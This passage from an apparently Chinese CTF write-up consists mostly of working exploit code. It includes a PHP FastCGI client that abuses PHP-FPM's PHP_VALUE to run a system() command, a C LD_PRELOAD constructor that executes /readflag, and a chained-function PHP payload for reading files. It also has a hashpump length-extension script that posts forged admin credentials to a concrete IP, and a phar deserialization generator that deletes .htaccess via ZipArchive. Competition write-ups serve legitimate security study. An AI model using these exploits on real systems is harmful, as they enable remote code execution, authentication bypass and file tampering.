            if (!$this-&gt;_sock) {
                throw new \Exception('Unable to connect to FastCGI application: ' . $errstr);
            }
            if (!$this-&gt;set_ms_timeout($this-&gt;_readWriteTimeout)) {
                throw new \Exception('Unable to set timeout on socket');
            }
        }
    }
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
            . chr($requestId &amp; 0xFF)        /* requestIdB0 */
            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */
            . chr($clen &amp; 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen &lt; 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
        }
        if ($vlen &lt; 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
        }
        /* nameData &amp; valueData */
        return $nvpair . $name . $value;
    }
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen &gt;= 128) {
                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
                $nlen |= (ord($data{$p++}) &lt;&lt; 16);
                $nlen |= (ord($data{$p++}) &lt;&lt; 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen &gt;= 128) {
                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
                $vlen |= (ord($data{$p++}) &lt;&lt; 16);
                $vlen |= (ord($data{$p++}) &lt;&lt; 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) &lt;&lt; 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) &lt;&lt; 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) {
            $resp = $this-&gt;decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len &amp;&amp; ($buf=fread($this-&gt;_sock, $len)) !== false) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf = fread($this-&gt;_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this-&gt;connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this-&gt;buildNvpair($info, '');
        }
        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this-&gt;readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this-&gt;readNvpair($resp['content'], $resp['length']);
        } else {
            throw new \Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $id = $this-&gt;async_request($params, $stdin);
        return $this-&gt;wait_for_response($id);
    }
    /**
     * Execute a request to the FastCGI application asyncronously
     * 
     * This sends request to application and returns the assigned ID for that request.
     *
     * You should keep this id for later use with wait_for_response(). Ids are chosen randomly
     * rather than seqentially to guard against false-positives when using persistent sockets.
     * In that case it is possible that a delayed response to a request made by a previous script 
     * invocation comes back on this socket and is mistaken for response to request made with same ID
     * during this request.
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return Integer
     */
    public function async_request(array $params, $stdin)
    {
        $this-&gt;connect();
        // Pick random number between 1 and max 16 bit unsigned int 65535
        $id = mt_rand(1, (1 &lt;&lt; 16) - 1);
        // Using persistent sockets implies you want them keept alive by server!
        $keepAlive = intval($this-&gt;_keepAlive || $this-&gt;_persistentSocket);
        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST
                                     ,chr(0) . chr(self::RESPONDER) . chr($keepAlive) . str_repeat(chr(0), 5)
                                     ,$id
                                     );
        $paramsRequest = '';
        foreach ($params as $key =&gt; $value) {
            $paramsRequest .= $this-&gt;buildNvpair($key, $value, $id);
        }
        if ($paramsRequest) {
            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest, $id);
        }
        $request .= $this-&gt;buildPacket(self::PARAMS, '', $id);
        if ($stdin) {
            $request .= $this-&gt;buildPacket(self::STDIN, $stdin, $id);
        }
        $request .= $this-&gt;buildPacket(self::STDIN, '', $id);
        if (fwrite($this-&gt;_sock, $request) === false || fflush($this-&gt;_sock) === false) {
            $info = stream_get_meta_data($this-&gt;_sock);
            if ($info['timed_out']) {
                throw new TimedOutException('Write timed out');
            }
            // Broken pipe, tear down so future requests might succeed
            fclose($this-&gt;_sock);
            throw new \Exception('Failed to write request to socket');
        }
        $this-&gt;_requests[$id] = array(
            'state' =&gt; self::REQ_STATE_WRITTEN,
            'response' =&gt; null
        );
        return $id;
    }
    /**
     * Blocking call that waits for response to specific request
     * 
     * @param Integer $requestId
     * @param Integer $timeoutMs [optional] the number of milliseconds to wait. Defaults to the ReadWriteTimeout value set.
     * @return string  response body
     */
    public function wait_for_response($requestId, $timeoutMs = 0) {
        if (!isset($this-&gt;_requests[$requestId])) {
            throw new \Exception('Invalid request id given');
        }
        // If we already read the response during an earlier call for different id, just return it
        if ($this-&gt;_requests[$requestId]['state'] == self::REQ_STATE_OK
            || $this-&gt;_requests[$requestId]['state'] == self::REQ_STATE_ERR
            ) {
            return $this-&gt;_requests[$requestId]['response'];
        }
        if ($timeoutMs &gt; 0) {
            // Reset timeout on socket for now
            $this-&gt;set_ms_timeout($timeoutMs);
        } else {
            $timeoutMs = $this-&gt;_readWriteTimeout;
        }
        // Need to manually check since we might do several reads none of which timeout themselves
        // but still not get the response requested
        $startTime = microtime(true);
        do {
            $resp = $this-&gt;readPacket();
            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                if ($resp['type'] == self::STDERR) {
                    $this-&gt;_requests[$resp['requestId']]['state'] = self::REQ_STATE_ERR;
                }
                $this-&gt;_requests[$resp['requestId']]['response'] .= $resp['content'];
            }
            if ($resp['type'] == self::END_REQUEST) {
                $this-&gt;_requests[$resp['requestId']]['state'] = self::REQ_STATE_OK;
                if ($resp['requestId'] == $requestId) { 
                    break;
                }
            }
            if (microtime(true) - $startTime &gt;= ($timeoutMs * 1000)) {
                // Reset
                $this-&gt;set_ms_timeout($this-&gt;_readWriteTimeout);
                throw new \Exception('Timed out');
            }
        } while ($resp);
        if (!is_array($resp)) {
            $info = stream_get_meta_data($this-&gt;_sock);
            // We must reset timeout but it must be AFTER we get info
            $this-&gt;set_ms_timeout($this-&gt;_readWriteTimeout);
            if ($info['timed_out']) {
                throw new TimedOutException('Read timed out');
            }
            if ($info['unread_bytes'] == 0
                    &amp;&amp; $info['blocked']
                    &amp;&amp; $info['eof']) {
                throw new ForbiddenException('Not in white list. Check listen.allowed_clients.');
            }
            throw new \Exception('Read failed');
        }
        // Reset timeout
        $this-&gt;set_ms_timeout($this-&gt;_readWriteTimeout);
        switch (ord($resp['content']{4})) {
            case self::CANT_MPX_CONN:
                throw new \Exception('This app can\'t multiplex [CANT_MPX_CONN]');
                break;
            case self::OVERLOADED:
                throw new \Exception('New request rejected; too busy [OVERLOADED]');
                break;
            case self::UNKNOWN_ROLE:
                throw new \Exception('Role value not known [UNKNOWN_ROLE]');
                break;
            case self::REQUEST_COMPLETE:
                return $this-&gt;_requests[$requestId]['response'];
        }
    }
}
if (!isset($_REQUEST['cmd'])) {
    die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
    $filepath = __FILE__;
}else{
    $filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
if (strpos($_REQUEST['host'], 'unix://') !== false) {
    $client = new Client($_REQUEST['host']);
}else{
    $client = new Client($_REQUEST['host'], $_REQUEST['port']);
}
$code = "&lt;?php system(\$_REQUEST['command']);?&gt;"; // php payload
if (version_compare(PHP_VERSION, '5.4.0') &gt;= 0) {
    $php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
}else{
    $php_value = "allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nauto_prepend_file = php://input\ndisable_function=";
}
$params = array(       
        'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
        'REQUEST_METHOD'    =&gt; 'POST',
        'SCRIPT_FILENAME'   =&gt; $filepath,
        'SCRIPT_NAME'       =&gt; $req,
        'QUERY_STRING'      =&gt; 'command='.$_REQUEST['cmd'],
        'REQUEST_URI'       =&gt; $uri,
        'DOCUMENT_URI'      =&gt; $req,
        #'DOCUMENT_ROOT'     =&gt; '/',
        'PHP_VALUE'         =&gt; $php_value,
        'SERVER_SOFTWARE'   =&gt; '80sec/wofeiwo',
        'REMOTE_ADDR'       =&gt; '127.0.0.1',
        'REMOTE_PORT'       =&gt; '9985',
        'SERVER_ADDR'       =&gt; '127.0.0.1',
        'SERVER_PORT'       =&gt; '80',
        'SERVER_NAME'       =&gt; 'localhost',
        'SERVER_PROTOCOL'   =&gt; 'HTTP/1.1',
        'CONTENT_LENGTH'    =&gt; strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
echo "Call: $uri\n\n";
echo strstr($client-&gt;request($params, $code), "PHP Version", true)."\n";
?&gt;</code></pre>
<pre><code>#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("/readflag &gt; /tmp/Sndav/flag");
}
`</code></pre>
<h3 data-content="1" id="4d0314046cca0ee0ff985ce5422eff8f">boring_code</h3>
<p>使用xxxbaidu.com绕过校验，考虑如何通过正则样子的函数，读取到flag。</p>
<pre><code>url=http://ip/?code=echo(readfile(end(scandir(pos(localeconv())))));</code></pre>
<p>可以列目录，但是读上一层的文件要么拼接字符串"../index.php"，要么就chroot/chdir。<br/>
chroot/chdir会返回一个true，还需要有另一个函数可以处理这个参数。决定使用 true-&gt;1-&gt;46-&gt;'.'，这个思路，最终payload</p>
<pre><code>url=http%3A%2F%2FIP%2Frua.php%3Fcode%3Decho(readfile(end(scandir(chr(floor(sqrt(sinh(sqrt(sinh(sinh(sinh(asin(ceil(ceil(chdir(next(scandir(pos(localeconv())))))))))))))))))))%3B</code></pre>
<h3 data-content="1" id="a5793f41632529e9337676772f98f27b">EzCMS</h3>
<ol>
<li>哈希扩展攻击</li>
<li>上传phar文件，配合反序列化扩展攻击面</li>
<li>选择ZipArchive 类，利用其open函数，移除掉.htaccess</li>
</ol>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">import</span> <span class="nn">hashpumpy</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="c1"># ?*8 adminadmin</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">hashpumpy</span><span class="o">.</span><span class="n">hashpump</span><span class="p">(</span><span class="s1">'52107b08c0f3342d2153ae1d68e6262c'</span><span class="p">,</span> <span class="s1">'adminadmin'</span><span class="p">,</span> <span class="s1">'a'</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>

<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'username'</span><span class="p">:</span><span class="s1">'admin'</span><span class="p">,</span>
    <span class="s1">'password'</span><span class="p">:</span> <span class="n">quote</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">5</span><span class="p">:])</span>
<span class="p">}</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'PHPSESSID'</span><span class="p">:</span><span class="s1">'1tdp5bqfks5mcsnbrjcbff90rs'</span><span class="p">,</span>
    <span class="s1">'user'</span><span class="p">:</span><span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="p">}</span>

<span class="n">a</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'http://112.126.102.158:9999/index.php'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>

<span class="k">print</span> <span class="n">cookies</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s2">"display_errors"</span><span class="p">,</span> <span class="s2">"On"</span><span class="p">);</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span> <span class="o">|</span> <span class="nx">E_STRICT</span><span class="p">);</span>
<span class="c1">//include "config.php";</span>

<span class="c1">//@unlink("phar.phar");</span>

<span class="k">class</span> <span class="nc">Profile</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$admin</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">File</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$filepath</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$checker</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">"sissel_lala.phar"</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="p">);</span> <span class="c1">//设置stub，增加gif文件头</span>
<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>

<span class="nv">$o</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="s2">"./sandbox/d64424a2bb45ef9baa40f945b741d6ee/c77e74e3c317a8fb80b46d0a4ada6473.sissel"</span><span class="p">;</span>
<span class="nv">$o</span><span class="o">-&gt;</span><span class="na">filepath</span> <span class="o">=</span> <span class="s2">"./sandbox/d64424a2bb45ef9baa40f945b741d6ee/.htaccess"</span><span class="p">;</span>
<span class="nv">$o</span><span class="o">-&gt;</span><span class="na">checker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Profile</span><span class="p">();</span>

<span class="nv">$o</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s2">"/var/www/html/sandbox/d64424a2bb45ef9baa40f945b741d6ee/.htaccess"</span><span class="p">;</span>
<span class="nv">$o</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nx">ZipArchive</span><span class="o">::</span><span class="na">OVERWRITE</span> <span class="o">|</span> <span class="nx">ZipArchive</span><span class="o">::</span><span class="na">CREATE</span><span class="p">;</span>
<span class="nv">$o</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>

<span class="c1">//$o = serialize($o);</span>

<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义meta-data存入manifest</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">"aaa.txt"</span><span class="p">,</span> <span class="s2">"test"</span><span class="p">);</span> <span class="c1">//添加要压缩的文件</span>
<span class="c1">//签名自动计算</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</pre></div>
</div>
</div>